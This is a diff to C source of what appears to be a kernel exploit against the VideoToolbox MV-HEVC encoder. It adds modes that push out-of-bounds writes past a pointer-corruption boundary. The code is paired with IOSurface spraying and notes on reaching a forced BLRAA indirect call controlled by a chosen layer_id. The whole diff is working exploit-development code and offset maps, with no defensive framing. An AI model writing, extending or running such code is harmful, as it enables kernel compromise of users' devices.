@@ -15,9 +15,10 @@
  *   TABLE 1 (buffer+0x3770):
  *   Entry 256 (~86 encodes): First OOB write
  *   Entry 588 (~196 enc): Firmware param array start (+0x5C34)
- *   Entry 592 (~197 enc): +0x5C70 target pointer CORRUPTED → CRASH
- *   Entry 593 (~198 enc): +0x5C88 source pointer CORRUPTED
- *   *** Entries 592+ unreachable without crash ***
+ *   Entry 592 (~198 enc): +0x5C70 target pointer CORRUPTED → CRASH?
+ *   Entry 593 (~198 enc): +0x5C88 source pointer (cumsum field)
+ *   *** Entries 592+ REACHABLE ONLY IF firmware memcpy restores +0x5C88 each encode ***
+ *   *** Use crash_test mode to determine reachability on-device ***
  *
  *   TABLE 2 (buffer+0x7DF4) — PRIMARY EXPLOITATION PATH:
  *   Entry 256 (~86 encodes): First OOB write
@@ -820,6 +821,67 @@ int main(int argc, char *argv[]) {
         for (int i = 0; i < SPRAY_COUNT; i++)
             if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
 
+    } else if (strcmp(mode, "crash_test") == 0) {
+        rlog("CRASH_TEST: Incrementally encode past the +0x5C70 crash boundary\n");
+        rlog("Entry 592 at +0x5C70 is first written during encode 198.\n");
+        rlog("The SIMD copy at 0x769bcc reads +0x5C88 → stores to +0x5C70 → uses as pointer.\n");
+        rlog("If firmware memcpy restores +0x5C88 each encode, entries 601+ are REACHABLE.\n");
+        rlog("If not, PAN fault crashes the kernel at encode 198.\n\n");
+        rlog("Strategy: encode one frame at a time near boundary, check survival.\n\n");
+        if (phase1_verify() != 0) goto done;
+        int ct_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
+        rlog("layer_id=0x%x\n", ct_lid);
+        VTCompressionSessionRef ct_s = create_mvhevc_encoder(128, 128, ct_lid);
+        if (!ct_s) { rlog("FAILED: encoder creation\n"); goto done; }
+        rlog("Phase A: Safe baseline (190 encodes)\n");
+        for (int i = 0; i < 190; i++) {
+            int st = encode_one(ct_s, i, 128, 128);
+            if (st != 0) { rlog("[%d] ENCODE ERROR: %d (pre-boundary!)\n", i, st); break; }
+            if ((i+1) % 50 == 0) rlog("[%d] ok, ~%d entries\n", i+1, (i+1)*3);
+        }
+        rlog("\nPhase B: Incremental approach to crash boundary\n");
+        rlog("Encode 191-205, one at a time. Crash expected ~198.\n\n");
+        for (int i = 190; i < 205; i++) {
+            rlog("[%d] encoding... (est entry %d, offset +0x%x)... ", i, i*3, 0x3770 + i*3*16);
+            int st = encode_one(ct_s, i, 128, 128);
+            if (st != 0) {
+                rlog("ERROR %d\n", st);
+                rlog("*** Encode %d failed with error %d ***\n", i, st);
+                rlog("If kernel didn't panic, the error may indicate driver-level rejection.\n");
+                break;
+            }
+            rlog("OK (survived! entries through %d)\n", (i+1)*3);
+            if (i == 197) {
+                rlog("*** ENCODE 198 SURVIVED — entries 592-594 written without crash ***\n");
+                rlog("*** The firmware memcpy likely restores +0x5C88 after OOB writes ***\n");
+                rlog("*** Entries 601+ (SIMD/BLRAA) ARE REACHABLE! ***\n");
+            }
+            if (i == 200) {
+                rlog("*** ENCODE 201 SURVIVED — entry 601 (+0x5C88 cumsum) written ***\n");
+                rlog("*** SIMD target pointer now contains cumsum value ***\n");
+            }
+        }
+        VTCompressionSessionCompleteFrames(ct_s, kCMTimeInvalid);
+        usleep(500000);
+        VTCompressionSessionInvalidate(ct_s); CFRelease(ct_s);
+
+    } else if (strcmp(mode, "blraa_boundary") == 0) {
+        rlog("BLRAA_BOUNDARY: Encode to entry 639 (just before BLRAA trigger at 642)\n");
+        rlog("Entry 642 (+0x5F94) byte 4 = layer_id controls BLRAA trigger.\n");
+        rlog("Entry 640 is +0x5F74, entry 641 is +0x5F84, entry 642 is +0x5F94.\n");
+        rlog("This probe encodes ~213 frames (639 entries) to measure behavior\n");
+        rlog("at the BLRAA boundary WITHOUT triggering the forced call.\n\n");
+        rlog("Strategy: If 213 encodes survive, the firmware data at +0x5F94\n");
+        rlog("was originally zero (normal path, no BLRAA). If it panics earlier,\n");
+        rlog("then the memcpy firmware data at +0x5F94 was already nonzero.\n\n");
+        int bb_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
+        rlog("layer_id=0x%x, targeting 213 encodes (639 entries)\n\n", bb_lid);
+        if (phase1_verify() != 0) goto done;
+        phase5_firmware(213, bb_lid);
+        rlog("\nIf we survived 213 encodes: BLRAA trigger at +0x5F94 is likely zero.\n");
+        rlog("Safe to attempt 214 encodes (entry 642) with controlled layer_id.\n");
+        rlog("The BLRAA will fire using whatever function pointer is at the call site.\n");
+
     } else if (strcmp(mode, "safe_max") == 0) {
         rlog("SAFE_MAX: Maximum safe encodes (196) with corruption check\n");
         rlog("Entry 591 (~197 enc) is the last safe entry before +0x5C70 crash\n");
@@ -881,6 +943,8 @@ int main(int argc, char *argv[]) {
         rlog("  spray      -- IOSurface spray + cross-buffer (400 encodes)\n");
         rlog("  firmware <lid> <enc> -- Custom firmware param test\n");
         rlog("  table2_heap [enc] [lid] -- Table 2 OOB + IOSurface spray test\n");
+        rlog("  crash_test [lid]     -- Incremental approach to +0x5C70 crash boundary\n");
+        rlog("  blraa_boundary [lid] -- 213 encodes, stop BEFORE BLRAA trigger at 642\n");
         rlog("  safe_max [lid]   -- Maximum safe encodes (196) before crash\n");
         rlog("  simd_target -- Target entries #630-633 (56-byte SIMD overwrite)\n");
         rlog("  simd_safe [lid]  -- 210 encodes, stop BEFORE SIMD overwrite\n");
@@ -891,6 +955,9 @@ int main(int argc, char *argv[]) {
         rlog("  256 (~86 enc):  First OOB write\n");
         rlog("  588 (~196 enc): Firmware param array start +0x5C34\n");
         rlog("  592 (~197 enc): +0x5C70 TARGET POINTER — CRASH BOUNDARY\n");
+        rlog("  601 (~200 enc): +0x5C88 cumsum corrupts SIMD target pointer\n");
+        rlog("  630 (~210 enc): +0x5ED4 SIMD source (56-byte header overwrite)\n");
+        rlog("  642 (~214 enc): +0x5F94 BLRAA trigger (forced indirect call)\n");
         rlog("  *** Entries 593+ UNREACHABLE from table 1 without crash ***\n");
         rlog("\nKey entry thresholds (TABLE 2):\n");
         rlog("  256 (~86 enc):  First OOB write (intra-buffer, 53 driver fields)\n");
